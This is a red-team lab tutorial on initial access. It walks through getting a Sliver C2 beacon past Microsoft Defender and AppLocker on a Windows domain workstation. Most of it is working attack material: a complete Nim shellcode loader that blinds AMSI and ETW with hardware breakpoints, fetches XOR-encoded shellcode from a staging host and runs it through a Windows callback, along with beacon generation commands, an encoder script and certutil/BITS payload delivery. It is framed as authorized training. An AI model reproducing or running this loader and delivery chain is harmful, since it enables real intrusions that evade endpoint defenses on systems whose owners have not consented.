# 02 - Initial Access: Get Your Beacon Past Defender

## Context: What You Are Simulating and Why

### Red Teaming and Adversary Simulation

Organizations hire red teams to simulate real-world attacks against their own infrastructure. The goal is to find security gaps before an actual threat actor does. The red team is given written authorization, operates under defined rules of engagement, and produces a report at the end detailing what they accessed and how. This is called **adversary simulation** because you are replicating the exact techniques, tools, and procedures that real attackers use.

The entities you are simulating are called **threat actors**. A threat actor is any individual or group that conducts unauthorized attacks against systems or networks. At the most capable end of the spectrum are **APTs** (Advanced Persistent Threats), which are well-funded, organized groups that operate over long timelines with specific objectives like stealing intellectual property, disrupting infrastructure, or establishing long-term access inside a target network. Nation-state-backed groups like Lazarus Group, APT29, or APT41 are examples. You are not going to hack like a script kiddie running `msfvenom`. You are replicating how APTs operate.

### The Kill Chain: Where This Module Fits

APT attacks follow a sequence of phases. Security researchers at Lockheed Martin formalized this as the **Cyber Kill Chain**. MITRE ATT&CK breaks it down further into hundreds of specific techniques. The first phase after reconnaissance is **Initial Access**, which is getting your code onto the target machine for the first time. That is this entire module.

Until you have a running process on the target machine, you have zero capability to do anything. You cannot read files, you cannot move laterally to other machines, you cannot dump credentials. Initial access is the prerequisite for everything that follows.

### Implants, Beacons, and C2

The code you place on the target machine is called an **implant**. Implants come in different types. A **beacon** is a specific type of implant that operates on a check-in schedule. It wakes up, connects back to your server, checks if there are any queued commands, runs them, sends the results, and goes quiet again. Between check-ins, there is no active network connection. This makes beacon traffic much harder to detect than a persistent open connection.

The server the beacon connects to is called a **C2 server** (Command and Control). All your commands go through the C2. In this lab, the C2 framework is **Sliver**, an open-source C2 tool developed by BishopFox. Sliver runs on Kali and manages all beacon communications.

The flow is: Sliver runs on Kali, the beacon runs on the victim machine, the beacon checks in to Sliver every 30 seconds, you issue commands through Sliver and the beacon executes them on the victim.

### What You Are Up Against: Defender and AppLocker

Getting a beacon running on a modern Windows corporate machine is not straightforward. Windows has two distinct security mechanisms that work independently of each other.

**Microsoft Defender** is the endpoint protection platform built into Windows. It uses signature-based detection, behavioral analysis, memory scanning, ETW telemetry, and cloud intelligence to detect and kill malicious processes. Bypassing Defender is primarily about evasion at the technical level: your code needs to avoid matching known signatures, avoid triggering behavioral heuristics, and avoid generating detectable telemetry.

**AppLocker** is an application whitelisting policy enforced by Windows. It does not analyze whether something is malicious. It only checks whether a program is in an approved location. If the program is not in an allowed path, it is blocked regardless of what it does. Bypassing AppLocker is about understanding its policy rules and finding paths it trusts or code types it does not control.

You need to defeat both. This module covers three techniques to do that, each using a different approach.

- **Method 1 - Standalone EXE**: A custom Nim-compiled loader dropped into `C:\Windows\Temp\` (an AppLocker-trusted path) and executed directly. Covers Defender evasion at the file and runtime level.
- **Method 2 - DLL Sideloading**: A malicious DLL placed next to a legitimate Microsoft-signed binary. When that binary loads the DLL as part of normal startup, your implant runs inside a trusted process. AppLocker has no default rules for DLLs.
- **Method 3 - Masqueraded EXE**: A loader compiled with a PDF icon and a double-extension filename. When executed, it opens a real decoy document and runs the implant silently. Used in phishing-based initial access scenarios.

Study all three methods even if you only run one. Each one demonstrates different defensive controls and how they are circumvented.

## Objective

Get a live Sliver beacon running as `CORP\vamsi` on `WORKSTATION01` with Defender active and AppLocker enforced.

---

## Before You Write Any Code

Do not skip this section. Every decision in the loader code corresponds to a specific detection mechanism. If you do not understand what each piece is defeating, you will not know how to fix it when something gets caught.

---

## How Defender Works

Defender operates across three detection layers: static analysis when a file lands on disk, behavioral analysis while the process is running, and cloud-based dynamic analysis.

### Static Analysis: When the File Lands on Disk

The moment a file is written to disk, Defender scans it before execution. Three checks happen at this stage.

**Check 1: Hash-based signature matching**

Every file in Defender's malware database is indexed by its cryptographic hash. A hash is a fixed-length number computed from the file's bytes. Any change to even one byte produces a completely different hash. When your file lands on disk, Defender computes its hash and checks it against the database. If it matches a known malicious file, the file is quarantined immediately.

This is why using publicly known tools like standard Metasploit shellcode or unmodified Cobalt Strike stagers fails instantly. Their hashes are in every Defender database. Writing your own loader in Nim from scratch produces a binary with a hash that does not exist in any database.

**Check 2: Static byte pattern signatures**

Even without a matching hash, Defender scans the raw bytes of the file for patterns associated with malicious code. Shellcode (raw machine code that forms the implant) has a characteristic byte structure. It is high-entropy, densely packed, and does not look like normal compiled program code. Defender maintains pattern signatures for common shellcode families.

XOR-encoding the shellcode before it ever touches disk defeats this check. XOR transforms the shellcode bytes using a key value, producing output that has no recognizable structure. Defender's pattern scanner finds nothing to match against.

**Check 3: Import table analysis**

Every PE (Portable Executable) file contains an import table listing the Windows API functions it calls. Defender reads this table before executing the file. A specific sequence of imports is a well-known shellcode loader fingerprint: `VirtualAlloc` to allocate memory, `WriteProcessMemory` or `memcpy` to write into it, `VirtualProtect` to mark it executable, and then execution via a thread or callback.

The loader resolves all sensitive functions dynamically at runtime using `GetProcAddress` instead of importing them statically. This means the import table contains none of the suspicious functions. Defender's import analysis sees a clean binary.

### Behavioral Analysis: While the Process Is Running

Passing static analysis does not mean the process is safe. Defender continues monitoring through runtime behavioral analysis.

**RWX memory detection**

Windows memory pages carry permission flags: Read, Write, and Execute. Legitimate programs separate these. Code pages are Read+Execute. Data pages are Read+Write. No normal program needs a memory region that is simultaneously Writable and Executable at the same time, because legitimate code is written at compile time, not injected at runtime.

A shellcode loader must write the decoded shellcode into memory and then execute it. If the same memory region is writable when the shellcode is written and executable when it runs, Defender flags it as a classic shellcode injection pattern and terminates the process.

The loader separates this into two distinct steps. It allocates a page with Write permission only, writes the decoded shellcode into it, then calls `VirtualProtect` to change that page's permission to Execute and remove Write. The page is never simultaneously writable and executable. This is the same memory management pattern used by JIT compilers in browsers and the .NET runtime, which is why Defender treats it as normal behavior.

**ETW telemetry**

ETW (Event Tracing for Windows) is the kernel-level telemetry infrastructure built into Windows. Every significant operation your process performs generates an ETW event: memory allocations, network connections, thread creation, modifications to executable memory. Defender, EDR products, and Windows Defender for Endpoint all consume this telemetry in real time to build a behavioral picture of your process.

The historical bypass was to patch the `EtwEventWrite` function inside `ntdll.dll` in memory, replacing its first bytes with a return instruction so the function does nothing. This technique is now reliably detected by Defender. It periodically checksums the bytes of loaded system DLLs in memory and compares them against the on-disk originals. Any discrepancy kills the process.

The loader uses hardware breakpoints instead. The x86-64 architecture provides four debug registers (DR0 through DR3) specifically for debuggers. You can set one of these registers to any memory address. When the CPU is about to execute a byte at that address, it raises a debug exception before executing a single instruction of the target function. A Vectored Exception Handler (VEH) registered in the process catches this exception and can modify the CPU context before returning, effectively skipping the function entirely.

The loader sets DR0 to the address of `EtwEventWrite`. Every time Windows tries to write an ETW event from within this process, the CPU raises a debug exception, the handler is called, the handler sets the return value and advances the instruction pointer past the function, and execution continues. No bytes of `ntdll.dll` are modified. No checksum fails. ETW events from this process are silently dropped.

**AMSI interception**

AMSI (Antimalware Scan Interface) is a Microsoft API that allows security products to scan content that executes in memory. It is integrated into PowerShell, the Windows Script Host, the .NET CLR, and other scripting runtimes. Before any script or command executes, AMSI passes the content to registered security providers (including Defender) for scanning. If the scan returns a detection, execution is blocked.

This is relevant because post-exploitation tools executed through the beacon (enumeration scripts, credential dumpers, lateral movement tools) are often delivered as PowerShell or .NET assemblies that never touch disk. Without AMSI bypass, those tools are caught immediately by in-memory scanning.

The loader applies the same hardware breakpoint technique to AMSI. DR1 is set to the address of `AmsiScanBuffer` inside `amsi.dll`. When anything in this process triggers an AMSI scan, the debug exception fires, the handler returns `AMSI_RESULT_CLEAN`, and the scan is bypassed without touching any DLL bytes.

**Behavioral sequence timing**

Defender's behavioral engine tracks sequences of actions and their timing. The pattern of: download data from a remote host, immediately allocate executable memory, immediately write to it, immediately execute it, is a well-documented shellcode loader sequence. At machine speed, this sequence is unambiguous.

Short `sleep()` calls inserted between each phase spread the sequence across time and break the timing correlation. The individual actions still happen, but they no longer form the tight temporal pattern Defender is looking for.

### Cloud-Based Dynamic Analysis

When Defender encounters a file it has not seen before, it may submit a sample to Microsoft's cloud sandbox for dynamic analysis. The sandbox executes the file in isolation, records its behavior, and can push new signatures back to Defender globally within minutes.

In this lab environment, the payload is served from a private RFC1918 address. Defender applies less aggressive cloud submission policies to files from local network sources. This is not a meaningful concern for the lab.

### Summary: Why Each Part of the Loader Exists

| Loader Design Decision | Defender Mechanism It Defeats |
|---|---|
| Custom Nim code compiled fresh | Hash-based signature database |
| XOR-encoded shellcode | Static byte pattern signatures |
| Dynamic API resolution at runtime | Import table analysis |
| Write-then-protect memory, never RWX simultaneously | RWX memory behavioral detection |
| Hardware breakpoint on EtwEventWrite | ETW telemetry collection |
| Hardware breakpoint on AmsiScanBuffer | AMSI in-memory content scanning |
| EnumSystemLocalesA callback execution | CreateThread-based shellcode execution signatures |
| sleep() calls between each phase | Behavioral sequence timing heuristics |

---

## How AppLocker Works

AppLocker is an application whitelisting policy enforced at the kernel level by the Software Restriction Policy infrastructure in Windows. It operates entirely independently from Defender. Where Defender analyzes what a program does, AppLocker only evaluates whether a program is authorized to run based on its path, publisher signature, or file hash.

The default AppLocker rules in a corporate environment allow execution from:
- `C:\Windows\` and all subdirectories
- `C:\Program Files\` and `C:\Program Files (x86)\`

Any executable that does not match an allow rule is blocked before a single instruction of it runs. The user sees a policy enforcement dialog. It does not matter whether the program is malicious or completely benign.

Three approaches bypass this:

**Option A: Use a trusted path.**
`C:\Windows\Temp\` is under `C:\Windows\`, so AppLocker allows execution from it. Standard domain users have Write access to this directory by design. Drop the loader there and execute from there.

**Option B: Use a trusted binary to fetch the payload.**
`certutil.exe` is a Microsoft-signed binary in `C:\Windows\System32\`. AppLocker trusts it unconditionally. It has a built-in URL download capability. Use certutil to fetch the loader directly into `C:\Windows\Temp\`. AppLocker does not inspect what trusted binaries download.

**Option C: Use a DLL instead of an EXE.**
AppLocker's default ruleset covers executable files (.exe, .com), scripts (.ps1, .bat, .vbs), and MSI installers. It does not have DLL rules enabled by default. A malicious DLL loaded by a trusted Microsoft-signed binary bypasses AppLocker entirely because DLL loading is not controlled under the default policy. This is the mechanism behind Method 2.

---


## Part 1: Setting Up Sliver on Kali

Revert your Kali VM to the `baseline-clean` snapshot before starting.

### 1.1 Start the Sliver Daemon and Console

Sliver is the C2 framework running on Kali. It manages all communications with the implant on the target machine. Sliver runs as a background daemon managed by systemd. You connect to it using the Sliver client, which gives you the interactive console where you issue all C2 commands.

```bash
# Start the daemon if it is not already running
sudo systemctl start sliver

# Make it start automatically after revert/reboot
sudo systemctl enable sliver

# Connect to the running daemon with the Sliver client
sliver
```

You will see the Sliver ASCII art banner and drop into the interactive console:

```
    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ...

All your sliver are belong to us...

sliver >
```

Leave this terminal open. You will run all Sliver commands from this `sliver >` prompt.

### 1.2 Start the HTTPS Listener

Before deploying the implant, you need the C2 listener running on Kali. The beacon will look for this listener when it first executes on the target. If the listener is not up, the beacon's first check-in fails and you get no session.

HTTPS on port 443 is chosen deliberately for OPSEC reasons. Port 443 carries all normal encrypted web browsing traffic. A connection from a workstation to port 443 on an external IP is indistinguishable from routine browser traffic at the network level. A connection on an unusual port like 4444 or 8080 would stand out immediately in network logs and trigger monitoring alerts.

```
sliver > https --lhost 192.168.10.10 --lport 443
```

You should see:

```
[*] Starting HTTPS :443 listener ...
[*] Successfully started job #1
```

Sliver is now listening on `192.168.10.10:443`. All incoming beacon check-ins from the target machine will be received on this port.

Verify the listener is up:

```
sliver > jobs
```

```
 ID  Name   Protocol  Port  Domains
==  =====  ========  ====  =======
 1   https  tcp       443
```

### 1.3 Generate the Beacon Shellcode

Sliver generates the implant as raw shellcode. Shellcode is position-independent machine code with no PE header or wrapper structure around it. Your Nim loader fetches this shellcode at runtime, decodes it in memory, and executes it via a Windows callback.

The shellcode output contains the full Sliver implant compiled into a format your loader can inject directly into memory. There is no staging step, no second server, no secondary download. One shellcode file, one C2 connection.

Run this inside the Sliver console:

```
sliver > generate beacon --http https://192.168.10.10:443 --os windows --arch amd64 --format shellcode --shellcode-encoder none --skip-symbols --seconds 30 --jitter 10 --save /tmp/beacon.bin
```

> **About the shellcode encoder prompt:** If you leave out `--shellcode-encoder none`, Sliver shows an interactive menu asking you to pick an encoder: `none`, `shikata_ga_nai`, `xor`, or `xor_dynamic`. These are Sliver's built-in obfuscation options for the raw shellcode output. In this module you are handling obfuscation yourself with XOR in the Python encoder script, so you always want `none` here. Adding `--shellcode-encoder none` to the command skips the interactive menu completely.

What each flag does:

| Flag | What it does |
|------|--------------|
| `generate beacon` | Tells Sliver to build a beaconing implant. A beacon checks in on a schedule rather than keeping a permanent connection open. |
| `--http https://192.168.10.10:443` | The address the beacon will connect to. The `--http` flag handles both HTTP and HTTPS. You tell it which protocol to use by including `https://` or `http://` at the start of the URL. |
| `--os windows` | The target operating system. |
| `--arch amd64` | 64-bit Windows target. |
| `--format shellcode` | Output the implant as raw shellcode bytes, not a full Windows executable. This is the format your Nim loader needs. |
| `--shellcode-encoder none` | Skip Sliver's built-in shellcode encoding. Your Nim loader applies your own XOR encoding, so you do not need Sliver's encoder on top of that. Without this flag, Sliver shows an interactive prompt asking you to pick an encoder. |
| `--skip-symbols` | Remove debug information from the output. This makes the file smaller and removes readable function names that could be matched against. |
| `--seconds 30` | How often the beacon checks in. Every 30 seconds in this case. |
| `--jitter 10` | Add a random delay of up to 10 seconds to each check-in. So the beacon checks in every 30 to 40 seconds instead of exactly every 30 seconds. This makes the timing less predictable. |
| `--save /tmp/beacon.bin` | Save the generated shellcode to this file path on Kali. |

Sliver compiles the implant in Go and converts it to raw shellcode. This takes 30 to 90 seconds.

```
[*] Generating new windows/amd64 beacon implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 47s
[*] Implant saved to /tmp/beacon.bin
```

Check the output file:

```bash
ls -la /tmp/beacon.bin
```

The output file will be 8 to 15 MB because it contains the full compiled Sliver implant, not a stub. This is why the shellcode is served from Kali's HTTP server and fetched at runtime rather than embedded in the loader binary. Embedding it would make the loader enormous and easy to identify by size alone.

> **Beacon mode vs session mode:** Session mode maintains a persistent TCP connection between the implant and C2. That open socket is visible in `netstat` output on the target and shows as a continuous connection in network flow logs. Beacon mode is fundamentally different: the implant connects on a schedule, transfers queued data, and disconnects. Between check-ins there is no active connection to detect. From a network monitoring perspective, periodic short-lived HTTPS connections blend into normal application telemetry traffic. Beacon mode is the operationally correct choice for any engagement where network monitoring is present. The 30-second interval in this lab is chosen so you do not wait long for command results.

---

## Part 2: XOR-Encode the Shellcode

The raw shellcode file cannot be shipped to the target as-is. Defender's static analysis reads the raw bytes of every file that lands on disk. Shellcode has a characteristic high-entropy byte structure that Defender's pattern signatures recognise.

XOR encoding is the pre-processing step that defeats this. XOR is a bitwise operation: each byte of the shellcode is combined with a key byte using the XOR operator, producing an output byte that has no structural relationship to the original. The entire shellcode becomes statistically random-looking output. Defender's pattern scanner finds no matching signatures.

Decryption is the same operation in reverse. XOR is its own inverse: applying XOR with the same key to encoded bytes restores the original. The loader performs this at runtime entirely in memory, so the decoded shellcode never touches disk.

XOR is sufficient for defeating static file scanning. More advanced loaders use AES-256 or ChaCha20 for stronger obfuscation against sandbox analysis and cloud-based dynamic scanning, but XOR clears the static detection layer which is what you need at this stage.

On Kali, create this Python script to encode the shellcode:

```bash
nano /tmp/xor_encode.py
```

Paste this:

```python
#!/usr/bin/env python3
import sys

# Read the raw shellcode
with open('/tmp/beacon.bin', 'rb') as f:
    shellcode = f.read()

# XOR key - you can change this to any value 1-255
# Do not use 0 (XOR with 0 does nothing)
XOR_KEY = 0xAB

# XOR every byte
encoded = bytes([b ^ XOR_KEY for b in shellcode])

# Write the encoded shellcode
with open('/tmp/beacon_encoded.bin', 'wb') as f:
    f.write(encoded)

# Also print as a Nim byte array you can paste into code
print(f"# XOR key: 0x{XOR_KEY:02X}")
print(f"# Original size: {len(shellcode)} bytes")
print(f"var shellcodeEncoded: array[{len(encoded)}, byte] = [")
hex_values = [f"0x{b:02X}" for b in encoded]
# Print in rows of 16
for i in range(0, len(hex_values), 16):
    row = hex_values[i:i+16]
    print("  " + ", ".join(row) + ",")
print("]")
```

Run it:

```bash
python3 /tmp/xor_encode.py
```

You will see output like:

```
# XOR key: 0xAB
# Original size: 896 bytes
var shellcodeEncoded: array[896, byte] = [
  0xFC, 0x2B, 0x4A, ...
  ...
]
```

Verify the output file exists:

```bash
ls -la /tmp/beacon_encoded.bin
```

The encoded shellcode is now at `/tmp/beacon_encoded.bin`. To Defender's static scanner, this file looks like random bytes. There are no shellcode signatures to match against.

---

## Part 3: Method 1 - Standalone Nim EXE Loader

Method 1 is a standalone PE loader cross-compiled from Kali targeting Windows x64. It is deployed directly into `C:\Windows\Temp\`, a path inside `C:\Windows\` that AppLocker's default rules allow execution from, and standard domain users have write access to by design.

Execution sequence on the target:
1. Hardware breakpoints are set on `EtwEventWrite` and `AmsiScanBuffer` via CPU debug registers, bypassing ETW telemetry and AMSI scanning without modifying any DLL bytes.
2. The encoded shellcode is fetched over HTTP from Kali's staging server.
3. The shellcode is XOR-decoded entirely in memory.
4. A `PAGE_READWRITE` memory region is allocated, the decoded shellcode is written into it, then `VirtualProtect` changes it to `PAGE_EXECUTE_READ`. The region is never simultaneously writable and executable.
5. `EnumSystemLocalesA` is called with the shellcode address as its callback. The beacon executes inside this function call without creating a new thread.

### 3.1 Set Up an HTTP Staging Server on Kali

The loader fetches the encoded shellcode from Kali over HTTP at runtime. This means the shellcode never sits on the target's disk before execution. The staging server is Python's built-in HTTP server, which requires no configuration and serves all files in the current directory:

```bash
cd /tmp
python3 -m http.server 8888
```

This serves all files in `/tmp/` over HTTP on port 8888. The loader will request `http://192.168.10.10:8888/beacon_encoded.bin` from the target machine at runtime.

Leave this terminal running. Open a new terminal for the following steps.

### 3.2 Write the Nim Loader

On Kali, create the loader source file:

```bash
nano /tmp/loader.nim
```

Read the inline comments carefully as you paste. Each section is annotated with the specific detection mechanism it addresses and why that approach is used instead of the simpler alternative.

```nim
import winim/lean
import winim/winstr
import winim/utils
import os
import httpclient
import strutils

# ============================================================
# CONFIGURATION
# Change these to match your Kali IP and XOR key
# ============================================================
const KALI_IP    = "192.168.10.10"
const KALI_PORT  = "8888"
const SC_PATH    = "/beacon_encoded.bin"
const XOR_KEY    = 0xAB.byte

# ============================================================
# WHY NOT MEMORY PATCHING
# The old approach was: overwrite the first bytes of
# AmsiScanBuffer and EtwEventWrite with a RET instruction.
# Defender in 2026 has SIGNATURES for those exact patch bytes.
# It also monitors VirtualProtect calls on amsi.dll and
# ntdll.dll memory. If you write 0xC3 to EtwEventWrite,
# Defender's periodic memory integrity scans catch it.
#
# Instead, we use HARDWARE BREAKPOINTS (HWBP).
# These use the CPU's debug registers (DR0-DR3) to intercept
# function execution WITHOUT modifying a single byte of code.
# Defender's memory integrity checks see untouched DLL code.
# ============================================================

# Global variables to store the addresses we want to intercept
var amsiScanBufferAddr: pointer = nil
var etwEventWriteAddr: pointer = nil

# ============================================================
# VECTORED EXCEPTION HANDLER (VEH)
# When the CPU hits a hardware breakpoint, it raises a
# STATUS_SINGLE_STEP exception. This handler catches it.
#
# For AmsiScanBuffer: we change the return value in RAX
# to E_INVALIDARG (0x80070057) and skip the function by
# setting RIP to the return address on the stack.
#
# For EtwEventWrite: we set RAX to 0 (STATUS_SUCCESS)
# and skip the function the same way.
#
# ZERO bytes of amsi.dll or ntdll.dll are modified.
# ============================================================
proc hwbpHandler(exInfo: PEXCEPTION_POINTERS): LONG {.stdcall.} =
  let rec = exInfo.ExceptionRecord
  let ctx = exInfo.ContextRecord

  # Only handle hardware breakpoint exceptions
  if rec.ExceptionCode != STATUS_SINGLE_STEP:
    return EXCEPTION_CONTINUE_SEARCH

  let faultAddr = cast[pointer](ctx.Rip)

  if faultAddr == amsiScanBufferAddr:
    # AmsiScanBuffer was called. We need to:
    # 1. Set RAX to E_INVALIDARG so the caller thinks the scan
    #    returned an error and treats the content as clean
    # 2. Set RIP to the return address (pop it from the stack)
    #    so the function is skipped entirely
    ctx.Rax = cast[DWORD64](0x80070057)
    # Return address is at the top of the stack (RSP points to it)
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    # Pop the return address off the stack (adjust RSP)
    ctx.Rsp = ctx.Rsp + 8
    # Set the Resume Flag so we do not re-trigger the breakpoint
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION

  elif faultAddr == etwEventWriteAddr:
    # EtwEventWrite was called. Skip it and return STATUS_SUCCESS.
    ctx.Rax = 0  # STATUS_SUCCESS
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    ctx.Rsp = ctx.Rsp + 8
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION

  # Not our breakpoint, pass to next handler
  return EXCEPTION_CONTINUE_SEARCH

# ============================================================
# SET HARDWARE BREAKPOINTS
# Uses CPU debug registers DR0 and DR1 to set execution
# breakpoints on AmsiScanBuffer and EtwEventWrite.
# No memory is modified. No VirtualProtect calls on DLLs.
# ============================================================
proc setHardwareBreakpoints() =
  # Resolve AmsiScanBuffer address
  let amsiDll = LoadLibraryA("amsi.dll")
  if amsiDll != 0:
    amsiScanBufferAddr = GetProcAddress(amsiDll, "AmsiScanBuffer")

  # Resolve EtwEventWrite address
  let ntdll = GetModuleHandleA("ntdll.dll")
  if ntdll != 0:
    etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite")

  # Register our VEH BEFORE setting breakpoints
  # Priority 1 = first handler in the chain
  discard AddVectoredExceptionHandler(1, hwbpHandler)

  # Get the current thread context (must include debug registers)
  var ctx: CONTEXT
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS

  let hThread = GetCurrentThread()
  discard GetThreadContext(hThread, addr ctx)

  # DR0 = AmsiScanBuffer address (breakpoint 0)
  if amsiScanBufferAddr != nil:
    ctx.Dr0 = cast[DWORD64](amsiScanBufferAddr)

  # DR1 = EtwEventWrite address (breakpoint 1)
  if etwEventWriteAddr != nil:
    ctx.Dr1 = cast[DWORD64](etwEventWriteAddr)

  # DR7 controls which breakpoints are active and their type.
  # Bit 0 = enable DR0 (local)
  # Bit 2 = enable DR1 (local)
  # Bits 16-17 = DR0 condition: 00 = break on execution
  # Bits 18-19 = DR0 length: 00 = 1 byte
  # Bits 20-21 = DR1 condition: 00 = break on execution
  # Bits 22-23 = DR1 length: 00 = 1 byte
  # Result: 0x00000005 (bits 0 and 2 set, all conditions = execute)
  ctx.Dr7 = 0x00000005

  # Apply the modified context back to the thread
  discard SetThreadContext(hThread, addr ctx)

# ============================================================
# SHELLCODE RUNNER
# 1. Fetch XOR-encoded shellcode from Kali over HTTP
# 2. Decode it in memory
# 3. Allocate RW memory (NOT RWX)
# 4. Write shellcode into RW memory
# 5. Flip memory to RX
# 6. Execute via callback (NOT CreateThread)
#
# WHY NOT CreateThread:
# CreateThread is heavily monitored by Defender and EDR.
# The pattern VirtualAlloc -> memcpy -> VirtualProtect ->
# CreateThread is a textbook shellcode injection signature.
#
# Instead, we use EnumSystemLocalesA. This is a legitimate
# Windows API that enumerates system locales by calling a
# callback function for each locale. We pass the address
# of our shellcode as the callback. Windows calls our
# shellcode as if it were a normal callback function.
# No new thread is created. The shellcode runs in the
# context of the existing thread via a legitimate API call.
# ============================================================
proc runShellcode() =
  let url = "http://" & KALI_IP & ":" & KALI_PORT & SC_PATH

  var client = newHttpClient()
  var encoded: string
  try:
    encoded = client.getContent(url)
  except:
    return

  if encoded.len == 0:
    return

  # XOR decode
  var shellcode = newSeq[byte](encoded.len)
  for i in 0 ..< encoded.len:
    shellcode[i] = cast[byte](encoded[i]) xor XOR_KEY

  let scLen = shellcode.len.SIZE_T

  # Allocate RW memory
  let mem = VirtualAlloc(nil, scLen, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil:
    return

  # Copy decoded shellcode into RW memory
  copyMem(mem, addr shellcode[0], shellcode.len)

  # Wipe the shellcode from the Nim heap immediately
  # so only the VirtualAlloc region contains it
  zeroMem(addr shellcode[0], shellcode.len)

  # Brief sleep to break behavioral timing patterns
  sleep(500)

  # Flip to RX (never RWX at any point)
  var oldProtect: DWORD = 0
  discard VirtualProtect(mem, scLen, PAGE_EXECUTE_READ, addr oldProtect)

  # Execute via callback instead of CreateThread
  # EnumSystemLocalesA calls our shellcode address as if
  # it were a locale enumeration callback function.
  # From Defender's perspective, a standard Windows API
  # is calling a function pointer - not a new thread
  # being spawned to execute shellcode.
  discard EnumSystemLocalesA(
    cast[LOCALE_ENUMPROCA](mem),  # callback = shellcode address
    LCID_INSTALLED                 # flag: enumerate installed locales
  )

# ============================================================
# ENTRY POINT
# ============================================================
when isMainModule:
  # Step 1: Install hardware breakpoints on AMSI and ETW
  # This uses CPU debug registers - no memory patching
  # No VirtualProtect on DLL code pages
  # No byte modifications to amsi.dll or ntdll.dll
  setHardwareBreakpoints()

  # Step 2: Run the shellcode
  # Uses callback execution, not CreateThread
  runShellcode()
```

Save the file.

### 3.3 Compile the Loader on Kali

```bash
nim c \
  -d:mingw \
  -d:release \
  --opt:size \
  --app:gui \
  --passL:-s \
  --cpu:amd64 \
  -o:/tmp/loader.exe \
  /tmp/loader.nim
```

What each flag does:

| Flag | What It Does |
|------|-------------|
| `-d:mingw` | Cross-compile for Windows. You are compiling on Kali (Linux) but producing a Windows executable. The MinGW toolchain handles the conversion. |
| `-d:release` | Build in release mode. Removes debug output and enables code optimisations. |
| `--opt:size` | Optimise the output for the smallest possible file size. A smaller binary takes less time to scan and contains less data for Defender to analyse. |
| `--app:gui` | Produce a GUI application with no console window. This is critical for two reasons. First, when the victim double-clicks the file, no black command prompt window flashes on screen. Second, when run from a CMD prompt, the process detaches immediately — CMD does not block waiting for it to exit. A console binary compiled with `--app:console` will freeze the terminal because `EnumSystemLocalesA` blocks until the shellcode returns, which never happens while the beacon is alive. |
| `--passL:-s` | Pass the `-s` flag to the linker. This removes all debug symbols and function name information from the binary. Defender cannot match function names it cannot read. |
| `--cpu:amd64` | Produce a 64-bit binary. The victim machine runs 64-bit Windows. |
| `-o:/tmp/loader.exe` | Set the output file name and path. |

Compilation takes 10 to 30 seconds. You should see output ending with `[SuccessX]`.

Verify the output:

```bash
ls -la /tmp/loader.exe
file /tmp/loader.exe
```

The `file` command should confirm a 64-bit Windows PE. File size should be under 300 KB. Symbol stripping (`--passL:-s`) removes all function names from the binary, eliminating name-based signature matching.

### 3.4 Deliver the Loader to the Target

The staging server on Kali (port 8888) is already serving `/tmp/`. The loader is reachable at `http://192.168.10.10:8888/loader.exe`.

On the target machine, log in as `CORP\vamsi`. No administrator rights are needed for this step.

`certutil.exe` is used for delivery. It is a Microsoft-signed binary in `C:\Windows\System32\` that AppLocker trusts unconditionally. Its `-urlcache` function can download files from HTTP URLs. This is a living-off-the-land technique: using a Windows-native signed binary for a task that would otherwise require dropping a third-party downloader. The download destination is `C:\Windows\Temp\`, which is in the AppLocker allow list and writable by standard users.

You should see:

```
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Confirm it downloaded:

```cmd
dir C:\Windows\Temp\loader.exe
```
```powershell
Start-BitsTransfer -Source 'http://192.168.10.10:8888/loader.exe' -Destination 'C:\Windows\Temp\loader.exe'
```
### 3.5 Execute the Loader

```cmd
C:\Windows\Temp\loader.exe
```

The CMD prompt returns immediately. No window appears. This is expected and correct behavior because the binary is compiled as a GUI application (`--app:gui`). Windows detaches it from the terminal immediately rather than waiting for the process to exit.

What is happening in the background:
1. Hardware breakpoints are installed on `AmsiScanBuffer` and `EtwEventWrite` via the CPU's DR0/DR1 debug registers. No DLL bytes are modified.
2. The loader connects to `192.168.10.10:8888` and fetches `beacon_encoded.bin`.
3. XOR decoding runs entirely in memory. The decoded shellcode exists only in RAM.
4. `VirtualAlloc` allocates a `PAGE_READWRITE` region. Shellcode is written. `VirtualProtect` flips it to `PAGE_EXECUTE_READ`. No RWX page is ever created.
5. `EnumSystemLocalesA` is called with the shellcode address as its callback. The Sliver implant begins executing inside this callback.

The beacon immediately starts making HTTPS check-ins to `192.168.10.10:443`.

### 3.6 Receive the Beacon Check-In

In the Sliver console on Kali, within 30 to 40 seconds you will see the first check-in:

```
[*] Beacon 0e66afcc COMPULSORY_DOORKNOB - 192.168.10.20:57584 (WORKSTATION01) - windows/amd64
```

Sliver assigns a randomly generated name to each implant. The ID and name will be different in your environment.

> **Do not run `sessions`**. Sessions and beacons are separate implant types in Sliver. A session maintains a persistent open connection and appears under `sessions`. A beacon uses periodic check-ins and appears only under `beacons`. Running `sessions` will show nothing even when your beacon is working correctly.

List your beacons:

```
sliver > beacons
```

You will see something like:

```
 ID         Name                  Transport  Hostname       Username    Operating System  Last Check-In  Next Check-In
========== ==================== ========== ============= =========== ================ ============= =============
 0e66afcc   COMPULSORY_DOORKNOB   http(s)    WORKSTATION01  CORP\vamsi  windows/amd64     15s            19s
```

Open the beacon:

```
sliver > use 0e66afcc
```

Replace `0e66afcc` with your actual beacon ID. The prompt changes:

```
sliver (COMPULSORY_DOORKNOB) >
```

Run a command:

```
sliver (COMPULSORY_DOORKNOB) > whoami
```

Commands in beacon mode are asynchronous. Sliver queues the task and the beacon picks it up on its next check-in. You will see a "Tasked" confirmation immediately, then the result arrives up to 30 seconds later:

```
corp\vamsi
```

Also verify which user account the beacon is running under:

```
sliver (COMPULSORY_DOORKNOB) > pwd
```

After the next check-in you will see something like:

```
[*] Current Token ID: CORP\vamsi

